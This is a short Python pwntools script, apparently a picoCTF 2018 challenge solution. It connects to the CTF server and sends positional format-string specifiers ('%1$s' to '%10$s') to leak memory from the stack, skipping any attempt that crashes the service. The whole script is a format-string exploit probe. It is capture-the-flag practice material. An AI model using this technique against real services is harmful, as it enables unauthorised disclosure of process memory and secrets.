from pwn import *

context.log_level = 'critical'

for i in range(1, 11):
    s = remote('2018shell.picoctf.com', 57169)
    s.recvuntil('> ')

    s.sendline('%' + str(i) + '$s')

    resp = s.recv()

    if 'dumped core' in resp:
        print('seg')
        s.close()
        continue

    print resp

    s.close()
